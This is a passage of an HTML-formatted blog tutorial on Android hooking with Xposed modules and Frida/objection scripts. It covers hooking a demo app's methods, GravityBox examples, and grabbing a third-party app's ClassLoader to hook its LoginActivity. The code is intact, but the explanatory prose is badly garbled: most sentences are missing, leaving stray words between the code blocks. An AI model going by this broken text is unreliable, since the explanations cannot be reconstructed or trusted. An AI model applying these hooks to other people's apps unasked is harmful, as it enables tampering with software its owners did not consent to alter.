Toast.makeText(MainActivity.<span class="built_in">this</span>, toastMessage(<span class="string">&quot;&quot;</span>), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toastMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;hook<code></code>hook<code>toastMessage&quot;&quot;</code></p><p>1xposed_init<code>com.roysue.xposed1.HookTest</code>hook<code>IXposedHookLoadPackage</code>Zygote<code>handleLoadPackage</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  import </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookTest</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//  logic-1 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;hookloadPackageParamloadPackageParam</p><div class="table-container"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>String</td><td>packageName</td><td></td></tr><tr><td>String</td><td>processName</td><td></td></tr><tr><td>ClassLoader</td><td>classLoader</td><td></td></tr><tr><td>ApplicationInfo</td><td>appInfo</td><td></td></tr></tbody></table></div><p>&emsp;packageName</p><p>2hookxposed<code>XposedHelpers</code>java<code>findAndHookMethod</code>hookhandlehook<code>XC_MethodHook</code><code>XC_MethodHook</code><code>findAndHookMethod</code><code>beforeHookedMethod</code><code>afterHookedMethod</code></p><p>&emsp; logic-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  hook </span></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="comment">// log </span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  packageName </span></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.roysue.xposed1&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;has hooked!&quot;</span>);</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;inner&quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.roysue.xposed1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="comment">//  findAndHookMethod  hook </span></span><br><span class="line">    XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;toastMessage&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">oldText</span> <span class="operator">=</span> (String) param.args[<span class="number">0</span>];</span><br><span class="line">            Log.d(<span class="string">&quot;oldText&quot;</span>, oldText);</span><br><span class="line">            param.args[<span class="number">0</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;Xposed Installer</p><p><img src="/images/frida-reverse-analysis-2/image-20231019193235633.png" alt="image-20231019193235633" style="zoom:37%;" /></p><h4 id="Hook-API-"><a href="#Hook-API-" class="headerlink" title="Hook API "></a>Hook API </h4><p>&emsp;XposedGravityBoxXposedhookAPI<code>GravityBox</code><a href="https://github.com/GravityBox/GravityBox"></a></p><p>&emsp;GravityBox</p><p>1xposed_init<code>com.ceco.r.gravitybox.GravityBox</code>IXposedHookZygoteInitIXposedHookLoadPackage</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GravityBox</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookZygoteInit</span>, IXposedHookLoadPackage &#123;</span><br><span class="line">    <span class="comment">//  logic-2 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;initZygoteZygoteinitZygoteGravityBoxinitZygoteinitZygoteXSharedPreferenceslogic-2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initZygote</span><span class="params">(StartupParam startupParam)</span> &#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    MODULE_PATH = startupParam.modulePath;</span><br><span class="line">    <span class="keyword">if</span> (XposedBridge.getXposedVersion() &lt; <span class="number">93</span>) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        prefs = <span class="keyword">new</span> <span class="title class_">XSharedPreferences</span>(prefsFileProt);</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (startupParam.startsSystemServer) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;GB:Hardware: &quot;</span> + Build.HARDWARE);</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// </span></span><br></pre></td></tr></table></figure><p>&emsp;logic-2handleLoadPackage<code>javahook</code>Application.onCreateifappxposedhook</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> &#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(SystemPropertyProvider.PACKAGE_NAME)) &#123;</span><br><span class="line">        SystemPropertyProvider.init(prefs, qhPrefs, tunerPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModLowBatteryWarning.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModLowBatteryWarning.init(prefs, qhPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModStatusbarColor.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModStatusbarColor.init(lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code></code>ModStatusbarColor.inithookXposedHelpersfindAndHookMethodModStatusbarColor.init</p><ul><li><p>afterHookedMethodbeforeHookedMethod<code>param.thisObject</code>hook</p></li><li><p>frida<code>..value</code>xposed<code>XposedHelpers.get&lt;type&gt;Field(,)</code><code>set&lt;type&gt;Field</code></p></li><li><p>fridajava.castxposedjava</p></li></ul><p>&emsp;GravityBoxModAudio.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;android.media.AudioManager&quot;</span>, classLoader, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objService</span> <span class="operator">=</span> XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;getService&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">mApplicationContext</span> <span class="operator">=</span> (Context) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mApplicationContext&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (objService != <span class="literal">null</span> &amp;&amp; mApplicationContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;disableSafeMediaVolume&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// </span></span><br></pre></td></tr></table></figure><p>&emsp;xposedfindAndHookConstructor</p><p>&emsp;<code>appXposedHelpers</code>XposedHelpers<code>java</code>XposedHelpersgetBooleanField</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">getBooleanField</span><span class="params">(Object obj, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> findField(obj.getClass(), fieldName).getBoolean(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">findField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> findFieldRecursiveImpl(clazz, fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    fieldCache.put(fullFieldName, field);</span><br><span class="line">    <span class="keyword">return</span> field;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">findFieldRecursiveImpl</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;FridaXposedXposedhookzygotefridahook</p><h4 id="Xposed-Hook"><a href="#Xposed-Hook" class="headerlink" title="Xposed Hook"></a>Xposed Hook</h4><p>&emsp;hookhookClassNotFoundExceptionfridaspawnhookfridaattachhook</p><p>&emsp;ClassLoaderappClassLoaderARTClassLoader<code>appClassLoader</code>                      </p><p>&emsp;xposedattach</p><p>&emsp;xposedzygoteappApplicationappClassLoader<code>ClassLoader</code> </p><p>&emsp;appapplicationattachBaseContextonCreatedexClassLoaderhook app</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.xxx.StubApp&quot;</span>, loadPackageParam.classloader, <span class="string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//  param </span></span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//  classLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">        <span class="comment">//  hook  classLoader  method </span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clzz, finalClassLoader, <span class="string">&quot;method&quot;</span>, ..., <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>&emsp;ApplicationattachBaseContexthook</p><p>&emsp;appzygote<code>ActivityThread.main</code>appActivityThreadActivityThreadActivityManageractivitiesbroadcast Receviers<code>ActivityThreadperformLaunchActivityactivityActivityThreadmInitialApplicationClassLoader</code></p><p>&emsp;movetvMainActivityhookhandleLoadPackage</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.cz.babySister&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;hooked &quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="comment">// hook ActivityThread </span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">ActivityThread</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">    <span class="comment">// performLaunchActivity  activity </span></span><br><span class="line">    XposedBridge.hookAllMethods(ActivityThread, <span class="string">&quot;performLaunchActivity&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">            <span class="comment">//  ActivityThread  mInitialApplication </span></span><br><span class="line">            <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">finalLoader</span> <span class="operator">=</span> mInitialApplication.getClassLoader();</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;found classloader is =&gt; &quot;</span> + finalLoader.toString());</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">BabyLogin</span> <span class="operator">=</span> finalLoader.loadClass(<span class="string">&quot;com.cz.babySister.activity.LoginActivity&quot;</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Debug -&gt; &quot;</span> + BabyLogin.toString());</span><br><span class="line">            XposedBridge.hookAllMethods(BabyLogin, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="comment">//  MainActivity  Log</span></span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;LoginActivity onCreate called&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231020201257929.png" alt="image-20231020201257929" style="zoom:67%;" /></p><h4 id="Frida--Xposed-Hook"><a href="#Frida--Xposed-Hook" class="headerlink" title="Frida  Xposed Hook"></a>Frida  Xposed Hook</h4><p>&emsp;fridaXposedhook<code>Xposed &amp;Xposed</code>objectioncom.roysue.xposed1.HookTest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.roysue.xposed1 explore</span><br><span class="line">android hooking search classes HookTest</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231020202510881.png" alt="image-20231020202510881" style="zoom:67%;" /></p><p>&emsp;ClassNotFoundException</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// </span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest</span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest$1</span><br><span class="line">// </span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest</span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest$1</span><br></pre></td></tr></table></figure><p>&emsp;<code>ClassLoaderobjectionfridaClassLoader</code>traceXposed.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders  frida  api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">//  classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.roysue.xposed1 -l traceXposed.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;com.roysue.xposed1.HookTestClassLoader</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215345260.png" alt="image-20231020215345260" style="zoom:67%;" /></p><p>&emsp;hookHookTestPrintStackHook</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders  frida  api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// hook PrintStack </span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>).<span class="property">PrintStack</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hacked by wd&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;buttonPrintStackhacked by wdClassLoadercom.roysue.xposed1.HookTestXposedapiXposedBridge.logClassNotFoundException<code>XposedXposedapiClassLoader</code></p><p>&emsp;XposedBridgeClassLoader</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders  frida  api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;de.robv.android.xposed.XposedBridge&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">//  classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215424099.png" alt="image-20231020215424099" style="zoom:67%;" /></p><p>&emsp;Xposed<code>/data/app/com.roysue.xposed1-1/base.apk</code>Xposedapi<code>/system/framework/XposedBridge.jar</code>XposedXposedIXposedHookLoadPackageXposedBridgeXposedBridge.jar</p><p>&emsp;xposedbeforeHookedMethodafterHookedMethod<code>new XC_MethodHook</code><code>HookTest$1</code>ClassLoader<code>HookTest$1</code>loaderxposedbeforeHookedMethodafterHookedMethodhook</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//  com.roysue.xposed1.HookTest$1  loader</span></span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable 